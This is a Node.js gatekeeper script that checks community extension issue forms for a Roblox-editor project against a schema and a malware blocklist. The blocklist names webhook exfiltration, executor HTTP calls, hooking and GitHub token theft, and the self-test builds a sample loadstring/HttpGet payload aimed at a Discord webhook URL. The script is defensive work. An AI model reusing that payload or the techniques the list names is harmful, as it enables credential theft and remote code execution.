#!/usr/bin/env node
/**
 * VS-RBLX Community Extension Issue Gatekeeper & Malware Scanner.
 * Enforces the exact same 5-template schema & malware blocklist as `src/runtime/extension_hub.lua`.
 *
 * Can run in two modes:
 *   1. GitHub Actions mode (reads `ISSUE_TITLE` & `ISSUE_BODY` env vars and writes JSON report to `GATEKEEPER_OUT` or stdout)
 *   2. CLI self-test mode (`node .github/scripts/validate_extension_issue.js --self-test`)
 */

"use strict";

const fs = require("fs");

const ALLOWED_TEMPLATES = new Set([
  "theme-pack",
  "snippet-pack",
  "command-macro",
  "keymap-preset",
  "toolbar-tool",
]);

const ALLOWED_ROOT_KEYS = new Set([
  "id",
  "name",
  "version",
  "author",
  "summary",
  "template",
  "theme",
  "snippets",
  "macros",
  "keymap",
  "tools",
]);

const SAFE_MACRO_OPS = new Set([
  "insertText",
  "openFile",
  "setSetting",
  "applyTheme",
  "openPreview",
  "bundleWorkspace",
  "toast",
]);

const SAFE_TRANSFORMS = new Set([
  "uppercase",
  "lowercase",
  "sortLines",
  "trimLines",
  "wrapPcall",
  "insertHeader",
]);

const MALWARE_RULES = [
  { re: /loadstring\s*\(/i, reason: "Dynamic code execution (`loadstring`) is forbidden" },
  { re: /loadfile\s*\(/i, reason: "Filesystem chunk loading (`loadfile`) is forbidden" },
  { re: /dofile\s*\(/i, reason: "Filesystem execution (`dofile`) is forbidden" },
  { re: /setfenv\s*\(/i, reason: "Environment hijacking (`setfenv`) is forbidden" },
  { re: /getfenv\s*\(/i, reason: "Environment inspection (`getfenv`) is forbidden" },
  { re: /string\.dump/i, reason: "Bytecode serialization (`string.dump`) is forbidden" },
  { re: /discord(?:app)?\.com\/api\/webhooks/i, reason: "Discord webhook exfiltration URL blocked", malicious: true },
  { re: /hooks\.slack\.com/i, reason: "Slack webhook exfiltration URL blocked", malicious: true },
  { re: /api\.telegram\.org\/bot/i, reason: "Telegram bot exfiltration URL blocked", malicious: true },
  { re: /webhook/i, reason: "Webhook reference is forbidden in extensions", malicious: true },
  { re: /httpget/i, reason: "Outbound `HttpGet` network call is forbidden", malicious: true },
  { re: /httppost/i, reason: "Outbound `HttpPost` network call is forbidden", malicious: true },
  { re: /requestasync/i, reason: "Outbound `RequestAsync` network call is forbidden", malicious: true },
  { re: /syn\.request|http_request|fluxus\.request/i, reason: "Executor HTTP request call is forbidden", malicious: true },
  { re: /websocket/i, reason: "WebSocket connection is forbidden", malicious: true },
  { re: /pastebin\.com|hastebin|grabify|ipify/i, reason: "External paste/logger host blocked", malicious: true },
  { re: /getgenv\s*\(|getrenv\s*\(|getreg\s*\(|getgc\s*\(/i, reason: "Executor environment/GC access is forbidden", malicious: true },
  { re: /hookfunction|hookmetamethod|newcclosure|getrawmetatable|setrawmetatable/i, reason: "Function/metatable hooking is forbidden", malicious: true },
  { re: /writefile\s*\(|delfile\s*\(|delfolder\s*\(|appendfile\s*\(/i, reason: "Direct executor disk write/delete call is forbidden", malicious: true },
  { re: /queue_on_teleport/i, reason: "Teleport persistence payload (`queue_on_teleport`) is forbidden", malicious: true },
  { re: /github\.pat/i, reason: "Reading protected `github.pat` credential setting is forbidden", malicious: true },
  { re: /\bghp_[A-Za-z0-9]+\b|\bgithub_pat_[A-Za-z0-9_]+\b/, reason: "Embedded GitHub Personal Access Token detected", malicious: true },
  { re: /moonsec|luraph|ironbrew/i, reason: "Obfuscated Luau payload signature blocked", malicious: true },
];

function parseIssueMarkdown(markdown) {
  const body = String(markdown || "").replace(/\r\n/g, "\n");
  const sections = {};
  let current = null;
  let buf = [];

  const flush = () => {
    if (current) {
      sections[current] = buf.join("\n").trim();
    }
    buf = [];
  };

  for (const line of body.split("\n")) {
    const m = line.match(/^###\s+(.+)$/);
    if (m) {
      flush();
      current = m[1].trim();
    } else if (current) {
      buf.push(line);
    }
  }
  flush();

  let jsonText = sections["Manifest JSON"] || "";
  const fenced = jsonText.match(/```(?:json)?\s*\n([\s\S]*?)\n```/);
  if (fenced) {
    jsonText = fenced[1].trim();
  }

  return {
    template: sections["Extension Template"] || "",
    id: sections["Extension ID"] || "",
    name: sections["Display Name"] || "",
    version: sections["Version"] || "",
    summary: sections["Summary"] || "",
    manifestJson: jsonText,
    attestations: sections["Security Attestations"] || "",
  };
}

function scanString(str, label, findings, state) {
  const s = String(str || "");
  if (!s) return;

  const decMatches = s.match(/\\\d{1,3}/g);
  if (decMatches && decMatches.length >= 6) {
    findings.push(`[${label}] Decimal-escaped bytecode sequence detected (${decMatches.length} escapes)`);
    state.malicious = true;
  }
  const hexMatches = s.match(/\\x[0-9a-fA-F]{2}/g);
  if (hexMatches && hexMatches.length >= 6) {
    findings.push(`[${label}] Hex-escaped payload sequence detected (${hexMatches.length} escapes)`);
    state.malicious = true;
  }

  for (const rule of MALWARE_RULES) {
    if (rule.re.test(s)) {
      findings.push(`[${label}] ${rule.reason}`);
      if (rule.malicious) state.malicious = true;
    }
  }
}

function scanValueRecursive(val, pathLabel, findings, state, depth) {
  if (depth > 8) {
    findings.push(`${pathLabel}: Nesting depth exceeds maximum limit (8)`);
    return;
  }
  if (typeof val === "string") {
    if (val.length > 4096) {
      findings.push(`${pathLabel}: String field exceeds 4 KB safety cap`);
    }
    scanString(val, pathLabel, findings, state);
  } else if (Array.isArray(val)) {
    if (val.length > 80) {
      findings.push(`${pathLabel}: Array exceeds 80 entries safety cap`);
      return;
    }
    val.forEach((item, idx) => scanValueRecursive(item, `${pathLabel}[${idx}]`, findings, state, depth + 1));
  } else if (val && typeof val === "object") {
    const keys = Object.keys(val);
    if (keys.length > 80) {
      findings.push(`${pathLabel}: Object exceeds 80 keys safety cap`);
      return;
    }
    for (const k of keys) {
      scanString(k, `${pathLabel}.<key>`, findings, state);
      scanValueRecursive(val[k], `${pathLabel}.${k}`, findings, state, depth + 1);
    }
  } else if (val !== null && typeof val !== "number" && typeof val !== "boolean") {
    findings.push(`${pathLabel}: Unsupported JSON value type`);
  }
}

function validateIssue(title, body) {
  const findings = [];
  const state = { malicious: false };
  const rawCombined = `${title || ""}\n${body || ""}`;

  if (rawCombined.length > 32768) {
    return {
      ok: false,
      malicious: false,
      findings: ["Issue body exceeds 32 KB maximum extension manifest limit."],
    };
  }

  scanString(title || "", "issue.title", findings, state);
  const form = parseIssueMarkdown(body || "");
  scanString(form.summary, "issue.summary", findings, state);

  if (!form.template || !form.id || !form.manifestJson) {
    findings.push(
      "Issue does not match the locked VS-RBLX Community Extension YAML Form (`### Extension Template`, `### Extension ID`, `### Manifest JSON`). Off-topic or free-form issues are not permitted."
    );
    return { ok: false, malicious: state.malicious, findings };
  }

  if (form.attestations && /-\s*\[\s\]/.test(form.attestations)) {
    findings.push("All Security Attestation checkboxes must be checked (`[X]`).");
  }

  let manifest = null;
  try {
    manifest = JSON.parse(form.manifestJson);
  } catch (err) {
    findings.push(`Invalid Manifest JSON syntax: ${err.message}`);
    return { ok: false, malicious: state.malicious, findings };
  }

  if (!manifest || typeof manifest !== "object" || Array.isArray(manifest)) {
    findings.push("Manifest JSON root must be a JSON object.");
    return { ok: false, malicious: state.malicious, findings };
  }

  for (const k of Object.keys(manifest)) {
    if (!ALLOWED_ROOT_KEYS.has(k)) {
      findings.push(`Disallowed root property in manifest: \`${k}\``);
    }
  }

  if (manifest.template !== form.template) {
    findings.push(`Form template (\`${form.template}\`) does not match \`manifest.template\` (\`${manifest.template}\`).`);
  }
  if (manifest.id !== form.id) {
    findings.push(`Form Extension ID (\`${form.id}\`) does not match \`manifest.id\` (\`${manifest.id}\`).`);
  }
  if (form.version && manifest.version !== form.version) {
    findings.push(`Form Version (\`${form.version}\`) does not match \`manifest.version\` (\`${manifest.version}\`).`);
  }

  const extId = String(manifest.id || "");
  const extName = String(manifest.name || "");
  const extVer = String(manifest.version || "");
  const tmpl = String(manifest.template || "");

  if (!/^[a-z0-9][a-z0-9-_]+$/.test(extId) || extId.length > 48) {
    findings.push("Invalid `id`: must match `^[a-z0-9][a-z0-9-_]+$` (max 48 chars).");
  }
  if (extName.length < 3 || extName.length > 64) {
    findings.push("Invalid `name`: must be 3–64 characters.");
  }
  if (!/^\d+\.\d+\.\d+$/.test(extVer)) {
    findings.push("Invalid `version`: must be strict SemVer (`X.Y.Z`).");
  }
  if (!ALLOWED_TEMPLATES.has(tmpl)) {
    findings.push(`Disallowed \`template\`: \`${tmpl}\` (must be one of the 5 allowed templates).`);
  }

  scanValueRecursive(manifest, "manifest", findings, state, 1);

  const hexRe = /^#[0-9a-fA-F]{6}$/;
  if (tmpl === "theme-pack") {
    if (!manifest.theme || typeof manifest.theme !== "object" || !manifest.theme.colors || typeof manifest.theme.colors !== "object") {
      findings.push("`theme-pack` requires `theme.colors` object.");
    } else {
      for (const [ck, cv] of Object.entries(manifest.theme.colors)) {
        if (typeof cv !== "string" || !hexRe.test(cv)) {
          findings.push(`Invalid hex color \`theme.colors.${ck}\`: \`${cv}\``);
        }
      }
      if (manifest.theme.syntax !== undefined) {
        if (!manifest.theme.syntax || typeof manifest.theme.syntax !== "object") {
          findings.push("`theme.syntax` must be an object.");
        } else {
          for (const [sk, sv] of Object.entries(manifest.theme.syntax)) {
            if (typeof sv !== "string" || !hexRe.test(sv)) {
              findings.push(`Invalid hex color \`theme.syntax.${sk}\`: \`${sv}\``);
            }
          }
        }
      }
    }
  } else if (tmpl === "snippet-pack") {
    if (!Array.isArray(manifest.snippets) || manifest.snippets.length < 1 || manifest.snippets.length > 25) {
      findings.push("`snippet-pack` requires `snippets` array (1–25 items).");
    } else {
      manifest.snippets.forEach((sn, idx) => {
        if (!sn || typeof sn.trigger !== "string" || !/^[A-Za-z0-9_-]+$/.test(sn.trigger) || typeof sn.insert !== "string" || !sn.insert) {
          findings.push(`Invalid snippet entry at \`snippets[${idx}]\`.`);
        }
      });
    }
  } else if (tmpl === "command-macro") {
    if (!Array.isArray(manifest.macros) || manifest.macros.length < 1 || manifest.macros.length > 10) {
      findings.push("`command-macro` requires `macros` array (1–10 items).");
    } else {
      manifest.macros.forEach((mc, idx) => {
        if (!mc || typeof mc.id !== "string" || !/^[A-Za-z0-9_.-]+$/.test(mc.id) || typeof mc.title !== "string" || !Array.isArray(mc.steps) || mc.steps.length < 1 || mc.steps.length > 8) {
          findings.push(`Invalid macro entry at \`macros[${idx}]\`.`);
        } else {
          mc.steps.forEach((st, sIdx) => {
            const op = st && typeof st === "object" ? String(st.op || "") : "";
            if (!SAFE_MACRO_OPS.has(op)) {
              findings.push(`Disallowed macro op \`${op}\` at \`macros[${idx}].steps[${sIdx}]\`.`);
            } else if (op === "setSetting" && String(st.key || "").toLowerCase().startsWith("github.")) {
              findings.push("Macro cannot modify protected `github.*` settings.");
              state.malicious = true;
            } else if (op === "openFile" && (/\.\./.test(String(st.path || "")) || /^\//.test(String(st.path || "")) || /\.vsrblx/i.test(String(st.path || "")))) {
              findings.push("Macro `openFile` path traversal / `.vsrblx` access blocked.");
              state.malicious = true;
            }
          });
        }
      });
    }
  } else if (tmpl === "keymap-preset") {
    if (!manifest.keymap || !Array.isArray(manifest.keymap.bindings) || manifest.keymap.bindings.length < 1 || manifest.keymap.bindings.length > 30) {
      findings.push("`keymap-preset` requires `keymap.bindings` array (1–30 items).");
    } else {
      manifest.keymap.bindings.forEach((kb, idx) => {
        if (!kb || typeof kb.key !== "string" || !/^[A-Za-z0-9]+$/.test(kb.key) || typeof kb.command !== "string" || kb.command.startsWith("run.")) {
          findings.push(`Invalid or disallowed keybinding at \`keymap.bindings[${idx}]\`.`);
        }
      });
    }
  } else if (tmpl === "toolbar-tool") {
    if (!Array.isArray(manifest.tools) || manifest.tools.length < 1 || manifest.tools.length > 6) {
      findings.push("`toolbar-tool` requires `tools` array (1–6 items).");
    } else {
      manifest.tools.forEach((tl, idx) => {
        if (!tl || typeof tl.id !== "string" || typeof tl.label !== "string" || !SAFE_TRANSFORMS.has(String(tl.transform || ""))) {
          findings.push(`Invalid or disallowed \`transform\` at \`tools[${idx}]\`.`);
        }
      });
    }
  }

  return {
    ok: findings.length === 0,
    malicious: state.malicious,
    findings,
    manifest: findings.length === 0 ? manifest : null,
  };
}

if (process.argv.includes("--self-test")) {
  // 1. Valid theme-pack issue
  const goodBody = [
    "### Extension Template",
    "",
    "theme-pack",
    "",
    "### Extension ID",
    "",
    "aurora-dark",
    "",
    "### Display Name",
    "",
    "Aurora Borealis Dark",
    "",
    "### Version",
    "",
    "1.0.0",
    "",
    "### Summary",
    "",
    "Northern lights emerald & slate color palette.",
    "",
    "### Manifest JSON",
    "",
    "```json",
    JSON.stringify({
      id: "aurora-dark",
      name: "Aurora Borealis Dark",
      version: "1.0.0",
      author: "tester",
      summary: "Northern lights palette.",
      template: "theme-pack",
      theme: { colors: { editor: "#0b1320", accent: "#00f5d4" }, syntax: { keyword: "#00f5d4" } },
    }),
    "```",
    "",
    "### Security Attestations",
    "",
    "- [X] Declarative only",
  ].join("\n");
  const rGood = validateIssue("[EXT] Aurora Borealis Dark", goodBody);
  if (!rGood.ok) {
    console.error("Self-test failed on valid extension:", rGood);
    process.exit(1);
  }

  // 2. Off-topic non-template issue -> rejected!
  const rOffTopic = validateIssue("pls add aimbot script", "hey how do i use this in blox fruits??");
  if (rOffTopic.ok) {
    console.error("Self-test failed to reject off-topic issue!");
    process.exit(1);
  }

  // 3. Malicious webhook / loadstring disguised inside snippet-pack -> rejected + flagged malicious!
  const evilBody = goodBody
    .replace("theme-pack", "snippet-pack")
    .replace(/"template":"theme-pack".*\}/, '"template":"snippet-pack","snippets":[{"trigger":"steal","insert":"loadstring(game:HttpGet(\\"https://discord.com/api/webhooks/123/abc\\"))()"}]}');
  const rEvil = validateIssue("[EXT] Helpful Snippets", evilBody);
  if (rEvil.ok || !rEvil.malicious) {
    console.error("Self-test failed to flag malicious webhook/loadstring issue!", rEvil);
    process.exit(1);
  }

  console.log("PASS validate_extension_issue.js self-test (valid=ALLOW, off-topic=CLOSE, malware=CLOSE+LOCK)");
  process.exit(0);
}

if (require.main === module) {
  const result = validateIssue(process.env.ISSUE_TITLE || "", process.env.ISSUE_BODY || "");
  const jsonOut = JSON.stringify(result, null, 2);
  if (process.env.GATEKEEPER_OUT) {
    fs.writeFileSync(process.env.GATEKEEPER_OUT, jsonOut, "utf8");
  } else {
    process.stdout.write(jsonOut + "\n");
  }
}

module.exports = { validateIssue, parseIssueMarkdown };
